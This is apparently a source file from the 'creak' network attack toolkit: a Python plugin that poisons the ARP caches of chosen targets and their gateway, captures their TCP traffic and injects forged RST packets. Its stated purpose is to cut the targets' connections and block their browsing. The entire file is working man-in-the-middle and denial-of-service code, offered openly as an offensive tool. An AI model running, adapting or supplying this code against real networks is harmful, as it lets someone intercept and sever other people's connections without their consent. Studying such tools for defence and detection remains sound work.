#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import time
from threading import Thread
from socket import socket, PF_PACKET, SOCK_RAW
try:
    import pcap
    import dpkt
except ImportError:
    print("[!] Missing modules pcap or dpkt, try setting SCAPY to True in config.py "
          "or install missing modules")
from baseplugin import BasePlugin
import creak.utils as utils
import creak.config as config

(G, W, R) = (utils.G, utils.W, utils.R)

class Plugin(BasePlugin):

    """
    """

    def init_plugin(self):
        self._set_info(
            author='codep',
            version='1.0',
            description='Intercept traffic on a subnet and deny all navigation capabilities of the targets')
        self._set_required_params(dev=True, target=True, gateway=True, src_mac=False, delay=False, stop=False)
        self._set_root(True)

    def _build_pcap_filter(self, prefix, port=None):
        """ build the pcap filter based on arguments self.target and port"""
        pcap_filter = prefix
        if isinstance(self.target, list):
            pcap_filter = "(%s " % pcap_filter
            for addr in self.target[:-1]:
                pcap_filter += "%s or " % addr
            pcap_filter += "%s) " % self.target[-1]
        else:
            pcap_filter += "%s" % self.target
        if port:
            pcap_filter += " and tcp port %s" % port

        return pcap_filter

    def _poison(self, dev, src_mac, gateway, target, delay, stop):
        """
        poison arp cache of target and router, causing all traffic between them to
        pass inside our machine, MITM heart
        """
        utils.set_ip_forward(1)
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
        try:
            while not stop():
                if config.VERBOSE is True:
                    self.print_output('%s <-- %s -- %s -- %s --> %s',
                                      gateway, target, dev, gateway, target)
                    if not isinstance(target, list):
                        sock.send(str(utils.build_arp_packet(
                            src_mac, gateway, target)))
                        sock.send(str(utils.build_arp_packet(
                            src_mac, target, gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
                    else:
                        for addr in target:
                            sock.send(str(utils.build_arp_packet(src_mac, gateway, addr)))
                            sock.send(str(utils.build_arp_packet(src_mac, addr, gateway)))
                        time.sleep(delay) # OS refresh ARP cache really often
            sock.close()
        except KeyboardInterrupt:
            self.print_output('\n\rPoisoning interrupted')
            sock.close()

    def rst_inject(self, kwargs):
        """
        injecting RESET packets to the target machine eventually blocking his
        connection and navigation
        """
        stop = False
        sock = socket(PF_PACKET, SOCK_RAW)
        sock.bind((kwargs['dev'], dpkt.ethernet.ETH_TYPE_ARP))
        pcap_filter = self._build_pcap_filter("ip host ", kwargs['port'])
        source = kwargs['src_mac'] if hasattr(kwargs, 'src_mac') else utils.get_default_gateway_linux()
        # need to create a daemon that continually poison our target
        poison_thread = Thread(target=self._poison,
                               args=(kwargs['dev'], source, kwargs['gateway'], kwargs['target'], 2, lambda: stop))
        poison_thread.daemon = True
        poison_thread.start()
        # start capturing packets
        packets = pcap.pcap(kwargs['dev'])
        packets.setfilter(pcap_filter) # we need only target packets

        print('[+] Start poisoning on ' + G + kwargs['dev'] + W + ' between ' + G + self.gateway + W
              + ' and ' + R
              + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W +'\n')

        if kwargs['port']:
            print('[+] Sending RST packets to ' + R
                  + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target'])
                  + W + ' on port ' + R + kwargs['port'] + W)
        else:
            print('[+] Sending RST packets to ' + R
                  + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W)

        if config.DOTTED is True:
            print('[+] Every dot symbolize a sent packet')

        counter = 0
        try:
            for _, pkt in packets:
                if stop:
                    break
                eth = dpkt.ethernet.Ethernet(pkt)
                ip_packet = eth.data
                if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
                    tcp = ip_packet.data
                    if tcp.flags != dpkt.tcp.TH_RST:
                        # build tcp layer
                        tcp_layer = dpkt.tcp.TCP(
                            sport=tcp.sport,
                            dport=tcp.dport,
                            seq=tcp.seq + len(tcp.data),
                            ack=0,
                            off_x2=0x50,
                            flags=dpkt.tcp.TH_RST,
                            win=tcp.win,
                            sum=0,
                            urp=0)
                        # build ip layer
                        ip_layer = dpkt.ip.IP(
                            hl=ip_packet.hl,
                            tos=ip_packet.tos,
                            len=40,
                            id=ip_packet.id + 1,
                            off=0x4000,
                            ttl=128,
                            p=ip_packet.p,
                            sum=0,
                            src=ip_packet.src,
                            dst=ip_packet.dst,
                            data=tcp_layer)
                        # build ethernet layer
                        eth_layer = dpkt.ethernet.Ethernet(
                            dst=eth.dst,
                            src=eth.src,
                            type=eth.type,
                            data=ip_layer)

                        sock.send(str(eth_layer))

                        if config.DOTTED is True:
                            utils.print_in_line('.')
                        else:
                            utils.print_counter(counter)

                        # rebuild layers
                        ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
                        tcp_layer.sport, tcp_layer.dport = tcp.dport, tcp.sport
                        tcp_layer.ack, tcp_layer.seq = tcp.seq + len(tcp.data), tcp.ack
                        eth_layer.src, eth_layer.dst = eth.dst, eth.src

                        sock.send(str(eth_layer))

                        if config.DOTTED is True:
                            utils.print_in_line('.')
                        else:
                            utils.print_counter(counter)
                            counter += 1

            sock.close()

        except KeyboardInterrupt:
            print('[+] Rst injection interrupted\n\r')
            sock.close()
            self.restore(2)
            utils.set_ip_forward(0)
